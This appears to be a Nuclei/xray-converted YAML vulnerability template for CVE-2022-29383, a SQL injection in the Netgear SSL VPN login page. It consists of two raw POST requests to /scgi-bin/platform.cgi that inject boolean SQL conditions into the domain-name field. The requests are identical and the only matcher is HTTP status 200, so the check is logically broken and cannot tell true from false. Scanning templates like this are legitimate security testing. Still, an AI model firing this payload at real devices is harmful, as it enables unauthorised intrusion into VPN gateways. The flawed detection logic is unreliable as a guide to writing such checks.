id: poc-yaml-netgear-ssl-vpn-20211222-cve-2022-29383

info:
  name: poc-yaml-netgear-ssl-vpn-20211222-cve-2022-29383
  author: xiaobaicai
  severity: critical
  tags: xray-converted,cve-2022-29383,ct-430812
  reference:
    - https://github.com/badboycxcc/Netgear-ssl-vpn-20211222-CVE-2022-29383

http:
  - raw:
      - |
        POST /scgi-bin/platform.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        thispage=index.htm&USERDBUsers.UserName=aaa&USERDBUsers.Password=aaa&USERDBDomains.Domainname=geardomain%27 and {{rand_int(1000, 9999)}}={{rand_int(1000, 9999)}} and %27{{rand_base(8)}}%27=%27{{rand_base(8)}}&button.login.USERDBUsers.router_status=Login&Login.userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%3B+Trident%2F7.0%3B+.NET4.0C%3B+.NET4.0E%3B+.NET+CLR+2.0.50727%3B+.NET+CLR+3.0.30729%3B+.NET+CLR+3.5.30729%3B+rv%3A11.0%29+like+Gecko

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        POST /scgi-bin/platform.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        thispage=index.htm&USERDBUsers.UserName=aaa&USERDBUsers.Password=aaa&USERDBDomains.Domainname=geardomain%27 and {{rand_int(1000, 9999)}}={{rand_int(1000, 9999)}} and %27{{rand_base(8)}}%27=%27{{rand_base(8)}}&button.login.USERDBUsers.router_status=Login&Login.userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%3B+Trident%2F7.0%3B+.NET4.0C%3B+.NET4.0E%3B+.NET+CLR+2.0.50727%3B+.NET+CLR+3.0.30729%3B+.NET+CLR+3.5.30729%3B+rv%3A11.0%29+like+Gecko

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200